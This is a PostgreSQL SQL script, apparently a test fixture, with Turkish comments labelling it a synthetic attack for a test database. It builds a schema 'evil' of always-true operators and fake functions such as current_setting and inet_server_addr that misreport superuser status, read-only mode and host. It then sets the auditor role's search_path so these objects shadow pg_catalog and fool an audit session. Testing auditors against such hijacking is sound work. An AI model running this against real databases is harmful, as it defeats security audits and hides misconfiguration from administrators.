-- SENTETIK golgeleme saldirisi (yalnizca test kumesi, hgs2_perftest_db).
-- Saldirgan modeli: denetim oturumunun search_path'ini (rol/veritabani ayari veya PGOPTIONS)
-- etkileyebilen ve bir semada nesne olusturabilen, super kullanici OLMAYAN bir taraf.
\set ON_ERROR_STOP on
CREATE SCHEMA evil;
GRANT USAGE ON SCHEMA evil TO PUBLIC;
-- Esitlik: 'on' ile karsilastirma disinda her zaman true (super kullanici kontrolunu tetiklememek icin)
CREATE FUNCTION evil.eq_tt(text, text) RETURNS boolean LANGUAGE sql IMMUTABLE
  AS 'SELECT CASE WHEN $2 OPERATOR(pg_catalog.=) ''on'' THEN pg_catalog.texteq($1, $2) ELSE true END';
CREATE FUNCTION evil.eq_nt(name, text) RETURNS boolean LANGUAGE sql IMMUTABLE AS 'SELECT true';
CREATE FUNCTION evil.eq_nn(name, name) RETURNS boolean LANGUAGE sql IMMUTABLE AS 'SELECT true';
CREATE FUNCTION evil.ne_tt(text, text) RETURNS boolean LANGUAGE sql IMMUTABLE AS 'SELECT true';
CREATE FUNCTION evil.ne_nt(name, text) RETURNS boolean LANGUAGE sql IMMUTABLE AS 'SELECT true';
CREATE FUNCTION evil.ne_nn(name, name) RETURNS boolean LANGUAGE sql IMMUTABLE AS 'SELECT true';
CREATE FUNCTION evil.ge_ii(int4, int4) RETURNS boolean LANGUAGE sql IMMUTABLE AS 'SELECT true';
CREATE FUNCTION evil.eq_ts(timestamptz, timestamptz) RETURNS boolean LANGUAGE sql IMMUTABLE AS 'SELECT true';
CREATE FUNCTION evil.sub_inet(inet, inet) RETURNS boolean LANGUAGE sql IMMUTABLE AS 'SELECT true';
CREATE FUNCTION evil.cat_tt(text, text) RETURNS text LANGUAGE sql IMMUTABLE AS 'SELECT ''x''';
CREATE OPERATOR evil.=   (LEFTARG = text, RIGHTARG = text, FUNCTION = evil.eq_tt);
CREATE OPERATOR evil.=   (LEFTARG = name, RIGHTARG = text, FUNCTION = evil.eq_nt);
CREATE OPERATOR evil.=   (LEFTARG = name, RIGHTARG = name, FUNCTION = evil.eq_nn);
CREATE OPERATOR evil.<>  (LEFTARG = text, RIGHTARG = text, FUNCTION = evil.ne_tt);
CREATE OPERATOR evil.<>  (LEFTARG = name, RIGHTARG = text, FUNCTION = evil.ne_nt);
CREATE OPERATOR evil.<>  (LEFTARG = name, RIGHTARG = name, FUNCTION = evil.ne_nn);
CREATE OPERATOR evil.>=  (LEFTARG = int4, RIGHTARG = int4, FUNCTION = evil.ge_ii);
CREATE OPERATOR evil.=   (LEFTARG = timestamptz, RIGHTARG = timestamptz, FUNCTION = evil.eq_ts);
CREATE OPERATOR evil.<<= (LEFTARG = inet, RIGHTARG = inet, FUNCTION = evil.sub_inet);
CREATE OPERATOR evil.||  (LEFTARG = text, RIGHTARG = text, FUNCTION = evil.cat_tt);
-- Sahte fonksiyonlar (ayni imza; search_path'te once gelirse secilir)
CREATE FUNCTION evil.current_setting(text) RETURNS text LANGUAGE sql STABLE
  AS 'SELECT CASE WHEN $1 OPERATOR(pg_catalog.=) ''is_superuser'' THEN ''off''
                  WHEN $1 OPERATOR(pg_catalog.=) ''transaction_read_only'' THEN ''on''
                  WHEN $1 OPERATOR(pg_catalog.=) ''transaction_isolation'' THEN ''repeatable read''
                  WHEN $1 OPERATOR(pg_catalog.=) ''search_path'' THEN ''pg_catalog, pg_temp''
                  ELSE pg_catalog.current_setting($1) END';
CREATE FUNCTION evil.current_database() RETURNS name LANGUAGE sql STABLE AS 'SELECT ''hgs2_perftest_db''::pg_catalog.name';
CREATE FUNCTION evil.now() RETURNS timestamptz LANGUAGE sql STABLE AS 'SELECT pg_catalog.statement_timestamp()';
CREATE FUNCTION evil.pg_is_in_recovery() RETURNS boolean LANGUAGE sql STABLE AS 'SELECT false';
CREATE FUNCTION evil.host(inet) RETURNS text LANGUAGE sql STABLE AS 'SELECT ''127.0.0.1''';
CREATE FUNCTION evil.inet_server_addr() RETURNS inet LANGUAGE sql STABLE AS 'SELECT ''127.0.0.1''::pg_catalog.inet';
GRANT EXECUTE ON ALL FUNCTIONS IN SCHEMA evil TO PUBLIC;
-- Kalici ve gercekci vektor: denetim rolune veritabani duzeyinde search_path
ALTER ROLE hgs2_auditor IN DATABASE hgs2_perftest_db SET search_path = evil, pg_catalog;
